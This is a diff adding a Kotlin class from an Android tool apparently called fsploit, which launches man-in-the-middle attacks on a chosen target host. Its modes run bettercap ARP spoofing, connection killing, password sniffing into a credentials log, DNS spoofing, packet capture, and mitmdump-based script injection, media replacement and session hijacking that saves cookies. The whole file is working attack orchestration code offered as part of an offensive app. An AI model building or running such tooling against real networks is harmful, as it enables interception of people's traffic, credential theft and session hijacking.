@@ -1,0 +1,328 @@
+package org.fsploit.android.data.mitm
+
+import org.fsploit.android.R
+import org.fsploit.android.core.ResourceProvider
+import org.fsploit.android.domain.model.ConnectionBlockMode
+import org.fsploit.android.domain.model.MitmLaunchRequest
+import org.fsploit.android.domain.model.MitmMode
+import org.fsploit.android.domain.model.MitmToolchainConfig
+import java.io.File
+
+class MitmSessionLauncher(
+    private val resourceProvider: ResourceProvider,
+    private val runtimeController: MitmRuntimeController,
+    private val bettercapCapletFactory: BettercapCapletFactory,
+    private val mitmdumpAddonFactory: MitmdumpAddonFactory
+) {
+    fun launch(
+        request: MitmLaunchRequest,
+        config: MitmToolchainConfig,
+        targetHost: String,
+        interfaceName: String,
+        gatewayAddress: String,
+        sessionDirectory: File,
+        logFile: File
+    ): MitmLaunchArtifacts {
+        val state = LaunchState()
+        try {
+            return when (request.mode) {
+                MitmMode.CONNECTION_KILL -> launchConnectionKill(
+                    state = state,
+                    config = config,
+                    networkMode = request.networkMode,
+                    interfaceName = interfaceName,
+                    targetHost = targetHost,
+                    sessionDirectory = sessionDirectory,
+                    logFile = logFile
+                )
+
+                MitmMode.SNIFFER -> launchSniffer(
+                    state = state,
+                    config = config,
+                    networkMode = request.networkMode,
+                    interfaceName = interfaceName,
+                    targetHost = targetHost,
+                    gatewayAddress = gatewayAddress,
+                    sessionDirectory = sessionDirectory,
+                    logFile = logFile
+                )
+
+                MitmMode.PASSWORD_SNIFFER -> launchPasswordSniffer(
+                    state = state,
+                    config = config,
+                    networkMode = request.networkMode,
+                    interfaceName = interfaceName,
+                    targetHost = targetHost,
+                    gatewayAddress = gatewayAddress,
+                    sessionDirectory = sessionDirectory
+                )
+
+                MitmMode.DNS_SPOOF -> launchDnsSpoof(
+                    state = state,
+                    config = config,
+                    networkMode = request.networkMode,
+                    interfaceName = interfaceName,
+                    targetHost = targetHost,
+                    gatewayAddress = gatewayAddress,
+                    dnsRules = request.payloadValue,
+                    sessionDirectory = sessionDirectory,
+                    logFile = logFile
+                )
+
+                MitmMode.REDIRECT,
+                MitmMode.IMAGE_REPLACE,
+                MitmMode.VIDEO_REPLACE,
+                MitmMode.SCRIPT_INJECTION,
+                MitmMode.CUSTOM_FILTER,
+                MitmMode.SESSION_HIJACK -> launchHttpMitmMode(
+                    state = state,
+                    request = request,
+                    config = config,
+                    networkMode = request.networkMode,
+                    targetHost = targetHost,
+                    interfaceName = interfaceName,
+                    gatewayAddress = gatewayAddress,
+                    sessionDirectory = sessionDirectory,
+                    logFile = logFile
+                )
+            }
+        } catch (exception: Exception) {
+            cleanup(state.toArtifacts())
+            throw exception
+        }
+    }
+
+    private fun launchConnectionKill(
+        state: LaunchState,
+        config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
+        interfaceName: String,
+        targetHost: String,
+        sessionDirectory: File,
+        logFile: File
+    ): MitmLaunchArtifacts {
+        return when (networkMode) {
+            ConnectionBlockMode.NORMAL -> {
+                val pid = requirePid(
+                    runtimeController.startBettercapCaplet(
+                        config = config,
+                        name = "connection_kill",
+                        interfaceName = interfaceName,
+                        sessionDirectory = sessionDirectory,
+                        logFile = logFile,
+                        capletContent = bettercapCapletFactory.buildArpBanCaplet(targetHost)
+                    )
+                )
+                state.pids.add(pid)
+                state.toArtifacts()
+            }
+
+            ConnectionBlockMode.HOTSPOT -> {
+                if (!runtimeController.applyForwardDrop(targetHost)) {
+                    throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
+                }
+                logFile.writeText("FORWARD DROP active for $targetHost on $interfaceName\n")
+                state.forwardDropTargetHost = targetHost
+                state.toArtifacts()
+            }
+        }
+    }
+
+    private fun launchSniffer(
+        state: LaunchState,
+        config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
+        interfaceName: String,
+        targetHost: String,
+        gatewayAddress: String,
+        sessionDirectory: File,
+        logFile: File
+    ): MitmLaunchArtifacts {
+        state.artifactPath = File(sessionDirectory, "capture.pcap").absolutePath
+        state.forwardingEnabled = true
+        runtimeController.setForwarding(true)
+        if (networkMode == ConnectionBlockMode.NORMAL) {
+            val bettercapPid = requirePid(
+                runtimeController.startBettercapCaplet(
+                    config = config,
+                    name = "spoof_relay",
+                    interfaceName = interfaceName,
+                    sessionDirectory = sessionDirectory,
+                    logFile = logFile,
+                    capletContent = bettercapCapletFactory.buildArpSpoofCaplet(targetHost, gatewayAddress)
+                )
+            )
+            state.pids.add(bettercapPid)
+        }
+
+        val tcpdumpPid = requirePid(
+            runtimeController.startDetachedProcess(
+                name = "tcpdump_capture",
+                sessionDirectory = sessionDirectory,
+                logFile = File(state.artifactPath),
+                body = runtimeController.buildTcpdumpScript(config, interfaceName, targetHost, state.artifactPath)
+            )
+        )
+        state.pids.add(tcpdumpPid)
+        return state.toArtifacts()
+    }
+
+    private fun launchPasswordSniffer(
+        state: LaunchState,
+        config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
+        interfaceName: String,
+        targetHost: String,
+        gatewayAddress: String,
+        sessionDirectory: File
+    ): MitmLaunchArtifacts {
+        state.artifactPath = File(sessionDirectory, "credentials.log").absolutePath
+        state.forwardingEnabled = true
+        runtimeController.setForwarding(true)
+        val bettercapPid = requirePid(
+            runtimeController.startBettercapCaplet(
+                config = config,
+                name = "password_sniff",
+                interfaceName = interfaceName,
+                sessionDirectory = sessionDirectory,
+                logFile = File(state.artifactPath),
+                capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
+                    bettercapCapletFactory.buildPasswordSniffCaplet(targetHost, gatewayAddress)
+                } else {
+                    bettercapCapletFactory.buildHotspotPasswordSniffCaplet(targetHost)
+                }
+            )
+        )
+        state.pids.add(bettercapPid)
+        return state.toArtifacts()
+    }
+
+    private fun launchDnsSpoof(
+        state: LaunchState,
+        config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
+        interfaceName: String,
+        targetHost: String,
+        gatewayAddress: String,
+        dnsRules: String,
+        sessionDirectory: File,
+        logFile: File
+    ): MitmLaunchArtifacts {
+        if (dnsRules.trim().isEmpty()) {
+            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_dns_rules_required))
+        }
+        state.artifactPath = File(sessionDirectory, "dns.spoof.hosts").absolutePath
+        state.forwardingEnabled = true
+        File(state.artifactPath).writeText(bettercapCapletFactory.normalizeDnsRules(dnsRules))
+        runtimeController.setForwarding(true)
+        val bettercapPid = requirePid(
+            runtimeController.startBettercapCaplet(
+                config = config,
+                name = "dns_spoof",
+                interfaceName = interfaceName,
+                sessionDirectory = sessionDirectory,
+                logFile = logFile,
+                capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
+                    bettercapCapletFactory.buildDnsSpoofCaplet(targetHost, gatewayAddress, state.artifactPath)
+                } else {
+                    bettercapCapletFactory.buildHotspotDnsSpoofCaplet(targetHost, state.artifactPath)
+                }
+            )
+        )
+        state.pids.add(bettercapPid)
+        return state.toArtifacts()
+    }
+
+    private fun launchHttpMitmMode(
+        state: LaunchState,
+        request: MitmLaunchRequest,
+        config: MitmToolchainConfig,
+        networkMode: ConnectionBlockMode,
+        targetHost: String,
+        interfaceName: String,
+        gatewayAddress: String,
+        sessionDirectory: File,
+        logFile: File
+    ): MitmLaunchArtifacts {
+        val addonFile = File(sessionDirectory, "mitm_addon.py")
+        state.artifactPath = if (request.mode == MitmMode.SESSION_HIJACK) {
+            File(sessionDirectory, "cookies.jsonl").absolutePath
+        } else {
+            ""
+        }
+        state.redirectPort = config.httpRedirectPort
+        state.forwardingEnabled = true
+        addonFile.writeText(mitmdumpAddonFactory.build(request, state.artifactPath))
+
+        val mitmdumpPid = requirePid(
+            runtimeController.startDetachedProcess(
+                name = "mitmdump_http",
+                sessionDirectory = sessionDirectory,
+                logFile = logFile,
+                body = runtimeController.buildMitmdumpScript(config, addonFile, state.redirectPort)
+            )
+        )
+        state.pids.add(mitmdumpPid)
+
+        runtimeController.setForwarding(true)
+        runtimeController.applyPortRedirect(state.redirectPort)
+        if (networkMode == ConnectionBlockMode.NORMAL) {
+            val bettercapPid = requirePid(
+                runtimeController.startBettercapCaplet(
+                    config = config,
+                    name = "http_relay",
+                    interfaceName = interfaceName,
+                    sessionDirectory = sessionDirectory,
+                    logFile = logFile,
+                    capletContent = bettercapCapletFactory.buildArpSpoofCaplet(targetHost, gatewayAddress)
+                )
+            )
+            state.pids.add(bettercapPid)
+        }
+
+        return state.toArtifacts()
+    }
+
+    private fun requirePid(pid: Long?): Long {
+        return pid ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
+    }
+
+    private fun cleanup(artifacts: MitmLaunchArtifacts) {
+        artifacts.pids.forEach(runtimeController::terminateProcess)
+        if (artifacts.redirectPort > 0) {
+            runtimeController.clearPortRedirect(artifacts.redirectPort)
+        }
+        if (artifacts.forwardingEnabled) {
+            runtimeController.setForwarding(false)
+        }
+        if (artifacts.forwardDropTargetHost.isNotBlank()) {
+            runtimeController.clearForwardDrop(artifacts.forwardDropTargetHost)
+        }
+    }
+
+    private class LaunchState {
+        var artifactPath: String = ""
+        var redirectPort: Int = 0
+        var forwardingEnabled: Boolean = false
+        var forwardDropTargetHost: String = ""
+        val pids = mutableListOf<Long>()
+
+        fun toArtifacts(): MitmLaunchArtifacts {
+            return MitmLaunchArtifacts(
+                artifactPath = artifactPath,
+                redirectPort = redirectPort,
+                forwardingEnabled = forwardingEnabled,
+                forwardDropTargetHost = forwardDropTargetHost,
+                pids = pids.toList()
+            )
+        }
+    }
+}
+
+data class MitmLaunchArtifacts(
+    val artifactPath: String = "",
+    val redirectPort: Int = 0,
+    val forwardingEnabled: Boolean = false,
+    val forwardDropTargetHost: String = "",
+    val pids: List<Long> = emptyList()
+)
